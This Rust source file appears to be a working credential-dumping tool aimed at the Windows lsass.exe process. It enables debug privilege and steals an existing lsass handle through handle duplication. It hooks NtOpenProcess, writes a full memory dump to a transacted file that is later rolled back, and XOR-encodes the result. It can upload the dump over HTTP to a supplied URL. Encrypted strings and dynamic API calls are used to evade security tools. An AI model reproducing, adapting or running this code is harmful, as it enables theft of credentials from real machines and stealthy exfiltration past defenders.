//#![crate_type = "cdylib"]
//cargo rustc -- --crate-type cdylib 
#[macro_use]
extern crate litcrypt;
use_litcrypt!();

extern crate base64;

use litcrypt::lc;
use rand::{thread_rng, Rng};
use rand::distributions::Alphanumeric;
use core::panic;
use std::io::Cursor;
use std::{fs::{self, File}, io::{Read, Write}, mem::{size_of}, ptr};
use bindings::Windows::Win32::{Foundation::{HANDLE}, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}};
use data::{PAGE_READONLY, PVOID, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO, PAGE_EXECUTE_READWRITE};

static mut STATIC_HANDLE: isize = 0;

//#[no_mangle]
 //pub extern "Rust" fn dump(key: &str) {
pub fn dump(key: &str, url: &str) {
    unsafe 
    {
        let privilege: u32 = 20; 
        let enable: u8 = 1; 
        let current_thread: u8 = 0;
        let enabled: *mut u8 = std::mem::transmute(&u8::default()); 
       
        //Enable SeDebugPrivilee
        let r = dinvoke::rtl_adjust_privilege(privilege,enable,current_thread,enabled);

        if r != 0 
        {
            panic!("{}",&lc!("[x] SeDebugPrivilege could not be enabled."));
        }
        else 
        {
            println!("{}", &lc!("[+] SeDebugPrivilege successfully enabled."));
        }

        let shi: *mut SYSTEM_HANDLE_INFORMATION;
        let mut ptr: PVOID;
        let mut buffer;
        let mut bytes = 1u32;
        let mut c = 0;

        loop
        { 
            buffer =  vec![0u8; bytes as usize];
            ptr = std::mem::transmute(buffer.as_ptr());
            let bytes_ptr: *mut u32 = std::mem::transmute(&bytes);
            // Query the system looking for handles information
            let x = dinvoke::nt_query_system_information(16,ptr,bytes,bytes_ptr);

            if x != 0 
            {
                bytes = *bytes_ptr;
            }
            else
            {
                shi = std::mem::transmute(ptr);
                break;
            }

            c = c + 1;

            if c > 20
            {
                panic!("{}", &lc!("[x] Timeout. Call to NtQuerySystemInformation failed."));
            }
        }     
        
        println!("{}{}{}",&lc!("[+] Retrieved "), (*shi).number_of_handles, &lc!(" handles. Starting analysis..."));
        let mut shtei: *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO = std::mem::transmute(&(*shi).handles);
        for counter in 0..((*shi).number_of_handles - 1) 
        {
            
            if counter % 10000 == 0 && counter > 0
            {
                println!("  \\ {} handles have been analyzed so far...", counter);
            }

            if (*shtei).process_id > 4
            {
                let handle_ptr: *mut HANDLE = std::mem::transmute(&HANDLE::default());
                let object_attributes: *mut OBJECT_ATTRIBUTES = std::mem::transmute(&OBJECT_ATTRIBUTES::default());
                let client_id = CLIENT_ID {UniqueProcess: HANDLE{0:(*shtei).process_id as isize}, UniqueThread: HANDLE::default()};
                let client_id: *mut CLIENT_ID = std::mem::transmute(&client_id);
               
                // PROCESS_DUP_HANDLE as access right
                let x = dinvoke::nt_open_process(
                    handle_ptr,
                    0x0040,
                    object_attributes,
                    client_id
                );

                let handle;
                if x == 0
                {
                    handle = *handle_ptr;
                }
                else 
                {
                    shtei = shtei.add(1);
                    continue;
                };
            

                if handle.0 != 0 && handle.0 != -1
                {
                    let target = HANDLE {0: (*shtei).handle_value as isize};
                    let dup_handle: *mut HANDLE = std::mem::transmute(&HANDLE::default());
                    // Duplicate handle in order to manipulate it
                    let x = dinvoke::nt_duplicate_object(
                        handle,
                        target,
                        GetCurrentProcess(),
                        dup_handle,
                        0x0400|0x0010, // PROCESS_QUERY_INFORMATION & PROCESS_VM_READ 
                        0,
                        0
                    );

                    if x != 0 
                    {
                        shtei = shtei.add(1);
                        let _r = dinvoke::close_handle(handle).unwrap();
                        continue;
                    }
                                       
                    let poti = PUBLIC_OBJECT_TYPE_INFORMATION::default();
                    let poti_ptr: PVOID = std::mem::transmute(&poti);
                    let ret_lenght: *mut u32 = std::mem::transmute(&u32::default());

                    // We obtain information about the handle. Two calls to NtQueryObject are required in order to make it work.
                    let _ = dinvoke::nt_query_object(
                        *dup_handle,
                        2,
                        poti_ptr,
                        size_of::<PUBLIC_OBJECT_TYPE_INFORMATION>() as u32,
                        ret_lenght
                    );


                    let buffer = vec![0u8; *ret_lenght as usize];
                    let poti_ptr: PVOID = std::mem::transmute(buffer.as_ptr());

                    let x = dinvoke::nt_query_object(
                        *dup_handle,
                        2,
                        poti_ptr,
                        *ret_lenght,
                        ret_lenght
                    );

                    if x != 0 
                    {
                        let _r = dinvoke::close_handle(*dup_handle).unwrap();
                        let _r = dinvoke::close_handle(handle).unwrap();
                        shtei = shtei.add(1);
                        continue;
                    }

                    let poti_ptr: *mut PUBLIC_OBJECT_TYPE_INFORMATION = std::mem::transmute(poti_ptr);
                    let poti = *poti_ptr;
                    let mut type_name: String = "".to_string();
                    let mut buffer: *mut u8 = poti.TypeName.Buffer.0 as *mut u8;
                    for _i in 0..poti.TypeName.Length
                    {
                        if *buffer as char != '\0'
                        {
                            type_name.push(*buffer as char);
                        }
                        buffer = buffer.add(1);

                    }

                    // We have a process handle
                    if type_name.to_lowercase() == "process"
                    {
                        let len = 500usize; // I dont really think it exists a process image name longer than 500 characters
                        let buffer = vec![0u8; len];
                        let buffer: *mut u16 = std::mem::transmute(buffer.as_ptr());
                        let ret_len: *mut u32 = std::mem::transmute(&len);
                        let z = dinvoke::query_full_process_image_name(
                            *dup_handle,
                            0,
                            buffer,
                            ret_len
                        );


                        if z == 0 
                        {
                            shtei = shtei.add(1);
                            let _r = dinvoke::close_handle(*dup_handle).unwrap();
                            let _r = dinvoke::close_handle(handle).unwrap();
                            continue;
                        }

                        let mut image_name: String = "".to_string();
                        let mut buff: *mut u8 = std::mem::transmute(buffer);
                        for _i in 0..(*ret_len) * 2 // Each char is followed by \0. Lovely LPWSTR...
                        {
                            if *buff as char != '\0' 
                            {
                                image_name.push(*buff as char);
                            }
                            buff = buff.add(1);

                        }

                        // We have a valid process handled
                        if image_name.contains(&lc!("lsass.exe"))
                        {               
                            let description = "\0\0".as_ptr() as *mut u16;
                            let z = dinvoke::create_transaction(
                                ptr::null_mut(),
                                ptr::null_mut(),
                                0,
                                0,
                                0,
                                0,
                                description
                            );

                            let transaction_handle: HANDLE;                           
                            if z.0 == -1 
                            {
                                shtei = shtei.add(1);
                                let _r = dinvoke::close_handle(*dup_handle).unwrap();
                                let _r = dinvoke::close_handle(handle).unwrap();
                                continue;
                            }
                            else
                            {
                                transaction_handle = z;
                            }
                            
                            let mini: *const u32 = std::mem::transmute(&0xffff);
                            let rand_string: String = thread_rng()
                            .sample_iter(&Alphanumeric)
                            .take(7)
                            .map(char::from)
                            .collect();

                            let file_name = format!(".\\{}{}", rand_string, ".log");
                            let file_name = file_name.as_ptr() as *mut u8;
                            let z = dinvoke::create_file_transacted(
                                file_name,
                                0x80000000 | 0x40000000,
                                0x00000002,
                                ptr::null(),
                                0x00000001, 
                                0x100 | 0x04000000,
                                HANDLE::default(),
                                transaction_handle,
                                mini,
                                ptr::null_mut()
                            );

                            let transacted_file_handle: HANDLE;
                            if z.0 == -1 
                            {                                
                                let _r = dinvoke::close_handle(transaction_handle).unwrap();
                                let _r = dinvoke::close_handle(*dup_handle).unwrap();
                                let _r = dinvoke::close_handle(handle).unwrap();
                                shtei = shtei.add(1);
                                continue;
                            }
                            else
                            {
                                transacted_file_handle = z;
                            }
                        
                            STATIC_HANDLE = (*dup_handle).0;

                            if !hook()
                            {
                                println!("{}", &lc!("[x] Could not hook NtOpenProcess."));
                                return;
                            }

                            // We use the duplicated handle to dump the process memory
                            let x = dinvoke::mini_dump_write_dump(
                                *dup_handle,
                                0, // Process Id does not seem to be needed 
                                transacted_file_handle,
                                0x00000002, // MiniDumpWithFullMemory
                                ptr::null_mut(),
                                ptr::null_mut(),
                                ptr::null_mut()
                            );
                            
                            if x == 1 
                            {
                                println!("{}",&lc!("[!] Lsass dump created!"));

                                let dump_size = dinvoke::get_file_size(
                                    transacted_file_handle,
                                    ptr::null_mut()
                                );

                                let z = dinvoke::create_file_mapping(
                                    transacted_file_handle,
                                    ptr::null(),
                                    PAGE_READONLY,
                                    0,
                                    0,
                                    ptr::null_mut()
                                );


                                let map_handle: HANDLE;
                                if z.0 == -1 
                                {
                                    shtei = shtei.add(1);
                                    let _r = dinvoke::close_handle(transacted_file_handle).unwrap();
                                    let _r = dinvoke::close_handle(transaction_handle).unwrap();
                                    let _r = dinvoke::close_handle(*dup_handle).unwrap();
                                    let _r = dinvoke::close_handle(handle).unwrap();
                                    continue;
                                }
                                else
                                {
                                    map_handle = z;
                                }
                                  
                                let ret = dinvoke::map_view_of_file(
                                    map_handle,
                                    4, // FILE_MAP_READ
                                    0,
                                    0,
                                    0
                                );

                                let mut view_ptr = ret as *mut u8;

                                let mut key_ptr = key.as_ptr();
                                let mut xor_key: u8 = *key_ptr;
                                key_ptr = key_ptr.add(1);
                                while *key_ptr != '\0' as u8
                                {
                                    xor_key = xor_key ^ *key_ptr;
                                    key_ptr = key_ptr.add(1);
                                }


                                let mut view_xor: Vec<u8> = vec![];
                                for _i in 0..dump_size
                                {
                                    view_xor.push(*view_ptr ^ xor_key);
                                    view_ptr = view_ptr.add(1);
                                }

                                let rand_string: String = thread_rng()
                                .sample_iter(&Alphanumeric)
                                .take(7)
                                .map(char::from)
                                .collect();

                                if url == ""
                                {

                                    let file_name = format!("{}{}", rand_string, ".txt");
                                    let mut file = std::fs::File::create(&file_name).unwrap();
                                    let _r = file.write(&view_xor).unwrap();

                                    println!("{} {}.", &lc!("[+] Memory dump written to file"), file_name.as_str());

                                }
                                else
                                {
                                    let rand_boundary: String = thread_rng()
                                    .sample_iter(&Alphanumeric)
                                    .take(16)
                                    .map(char::from)
                                    .collect();

                                    let boundary: &str = &format!("{},{}", "------------------------", rand_boundary);
                                    let mut data = Vec::new();
                                    let _ = write!(data, "--{}\r\n", boundary);
                                    let _ = write!(data, "Content-Disposition: form-data; name=\"file\"; filename=\"{}\"\r\n", rand_string);
                                    let _ = write!(data, "Content-Type: text/plain\r\n");
                                    let _ = write!(data, "\r\n");

                                    let _ = write!(data, "{}", base64::encode(&view_xor));
                                    let _ = write!(data, "\r\n"); // The key thing you are missing
                                    let _ = write!(data, "--{}--\r\n", boundary);

                                    let read = Cursor::new(&data);
                                    let cont_type = format!("multipart/form-data; boundary={}", boundary);
                                    let _ = ureq::post(url)
                                        .set("content-type",cont_type.as_str()) 
                                        .set("Content-Length", data.len().to_string().as_str())
                                        .send(read);

                                    println!("{}", &lc!("[+] File uploaded."));
                                }

                                let unmap = dinvoke::unmap_view_of_file(ret);

                                if unmap
                                {
                                    println!("{}", &lc!("[+] Successfully unmapped view of file."));
                                }


                                let ret = dinvoke::rollback_transaction(transaction_handle);

                                if ret
                                {
                                    println!("{}",&lc!("[+] Transaction rollbacked."));
                                }

                                let _r = dinvoke::close_handle(transacted_file_handle).unwrap();
                                let _r = dinvoke::close_handle(map_handle).unwrap();
                                let _r = dinvoke::close_handle(transaction_handle).unwrap();

                                break;
                            }
                            else 
                            {
                                let _r = dinvoke::close_handle(transacted_file_handle).unwrap();
                                let _r = dinvoke::close_handle(transaction_handle).unwrap();
                            }
                        }
                    }

                    let _r = dinvoke::close_handle(*dup_handle).unwrap();
                }

                let _r = dinvoke::close_handle(handle).unwrap();
            }

            shtei = shtei.add(1);

            if counter == (*shi).number_of_handles - 1
            {
                println!("{}", &lc!("[x] Could not retrieve a valid handle. Exiting."));
            }
        }            
    }
}

pub fn hook () -> bool
{
    unsafe 
    {

        let detour_addresss: usize = std::mem::transmute(nt_open_process_detour as fn (*mut HANDLE, u32, *mut OBJECT_ATTRIBUTES, *mut CLIENT_ID) -> i32);

        let ntdll = dinvoke::get_module_base_address(&lc!("ntdll.dll"));
        let handle = GetCurrentProcess();
        let ntop_base_address = dinvoke::get_function_address(ntdll, &lc!("NtOpenProcess"));
        let base_address: *mut PVOID = std::mem::transmute(&ntop_base_address);
        let size = 13 as usize; // for x64 processor
        let size: *mut usize = std::mem::transmute(&size);
        let old_protection: *mut u32 = std::mem::transmute(&u32::default());

        let z = dinvoke::nt_protect_virtual_memory( 
            handle,
            base_address,
            size,
            PAGE_EXECUTE_READWRITE,
            old_protection
        );


        if z != 0
        {
            return false;
        }


        let ntop_ptr = ntop_base_address as *mut u8;

        if cfg!(target_pointer_width = "64") {

            *ntop_ptr = 0x49;
            *(ntop_ptr.add(1)) = 0xBB;
            *(ntop_ptr.add(2) as *mut usize) = detour_addresss;
            *(ntop_ptr.add(10)) = 0x41;
            *(ntop_ptr.add(11)) = 0xFF;
            *(ntop_ptr.add(12)) = 0xE3;
    
        } 
        else 
        {
            *ntop_ptr = 0x68;
            *(ntop_ptr.add(1) as *mut usize) = detour_addresss;
            *(ntop_ptr.add(5)) = 0xC3
        } 
        
        let unused: *mut u32 = std::mem::transmute(&u32::default());

        let z = dinvoke::nt_protect_virtual_memory(
            handle,
            base_address,
            size,
            *old_protection,
            unused
        );


        if z != 0
        {
            return false;
        }

        println!("{}", &lc!("[+] NtOpenProcess hooked."));

        true
    }

}

pub fn nt_open_process_detour (mut _process_handle: *mut HANDLE, _access: u32, _object_attributes: *mut OBJECT_ATTRIBUTES, _client_id: *mut CLIENT_ID)  -> i32
{
    unsafe 
    {
        let dup_handle = HANDLE{0: STATIC_HANDLE};
        let _  = dinvoke::set_handle_information(
            dup_handle,
            0x00000002, // HANDLE_FLAG_PROTECT_FROM_CLOSE
            0x00000002
        );

        _process_handle = std::mem::transmute(&dup_handle);//dup_handle;

        0
    }
}

pub fn decrypt (file_path: &str, key: &str, output_file: &str) 
{
    unsafe{

        let mut file = File::open(file_path).expect("[x] Error opening input file.");
        let metadata = fs::metadata(file_path).unwrap();
        let mut buffer = vec![];
        file.read_to_end(&mut buffer).unwrap();


        let mut buffer_ptr = buffer.as_ptr();

        let mut key_ptr = key.as_ptr();
        let mut xor_key: u8 = *key_ptr;
        key_ptr = key_ptr.add(1);
        while *key_ptr != '\0' as u8
        {
            xor_key = xor_key ^ *key_ptr;
            key_ptr = key_ptr.add(1);
        }

        let mut file_content: Vec<u8> = vec![];
        for _i in 0..metadata.len()
        {
            file_content.push(*buffer_ptr ^ xor_key);
            buffer_ptr = buffer_ptr.add(1);
        }

        let mut output = std::fs::File::create(output_file).unwrap();
        let _r = output.write_all(&file_content).unwrap();
    }

    println!("{}", &lc!("[+] Successfully unencrypted minidump file."))

}
